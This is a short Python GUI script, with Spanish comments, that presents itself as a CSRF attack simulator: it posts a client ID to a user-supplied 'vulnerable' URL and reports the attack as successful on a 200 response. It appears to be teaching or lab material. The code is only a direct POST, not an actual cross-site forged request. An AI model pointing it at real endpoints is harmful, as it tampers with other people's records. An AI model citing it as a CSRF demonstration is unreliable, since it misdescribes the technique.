import customtkinter as ctk
import requests # type: ignore
from tkinter import messagebox

# Función para realizar el ataque CSRF
def atacar_csrf():
    url_vulnerable = entry_url.get()
    id_cliente = entry_id_cliente.get()
    
    # Payload malicioso simulado
    payload = {'id': id_cliente}
    
    try:
        # Simular la solicitud CSRF sin token de validación
        response = requests.post(url_vulnerable, data=payload)
        cuadro_resultado.delete(1.0, ctk.END)
        if response.status_code == 200:
            cuadro_resultado.insert(ctk.END, f"Ataque CSRF realizado con éxito. Respuesta:\n{response.text}")
        else:
            cuadro_resultado.insert(ctk.END, f"Error en la solicitud: {response.status_code}")
    except Exception as e:
        messagebox.showerror("Error", f"Error al realizar el ataque: {e}")

# Interfaz gráfica para ataque CSRF
def inicializar_interfaz_csrf():
    root = ctk.CTk()
    root.title("Simulación de Ataque CSRF")
    root.geometry("500x400")

    ctk.CTkLabel(root, text="Simulación de Ataque CSRF").pack(pady=10)

    global entry_url, entry_id_cliente, cuadro_resultado

    # Entrada para la URL del endpoint vulnerable
    ctk.CTkLabel(root, text="Introduce la URL Vulnerable").pack(pady=5)
    entry_url = ctk.CTkEntry(root, width=400)
    entry_url.pack(pady=5)

    # Entrada para el ID del cliente
    ctk.CTkLabel(root, text="Introduce el ID del cliente").pack(pady=5)
    entry_id_cliente = ctk.CTkEntry(root, width=400)
    entry_id_cliente.pack(pady=5)

    # Botón para ejecutar el ataque
    ctk.CTkButton(root, text="Lanzar Ataque CSRF", command=atacar_csrf).pack(pady=10)

    # Cuadro de texto para mostrar resultados del ataque
    cuadro_resultado = ctk.CTkTextbox(root, width=400, height=200)
    cuadro_resultado.pack(pady=10)

    root.mainloop()

inicializar_interfaz_csrf()
